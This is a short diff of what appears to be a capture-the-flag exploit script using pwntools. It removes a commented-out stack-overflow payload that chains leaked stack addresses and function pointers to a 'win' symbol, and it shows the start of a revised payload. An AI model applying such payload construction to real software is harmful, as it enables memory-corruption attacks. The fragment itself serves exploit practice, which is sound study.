@@ -73,17 +73,6 @@ def overflow():
 
     stack_leak = get_leak()
 
-    '''payload = flat(
-        b"A" * 8,
-        stack_leak + 0x10,
-        p64(func3 + 13),
-        p64(func2 + 13),
-        b"B" * 96,
-        stack_leak + 8,
-        p64(func4 + 13),
-        elf.symbols['win'],
-    )'''
-
     payload = flat(
         b"A" * 0x20,
         stack_leak + 0x40,
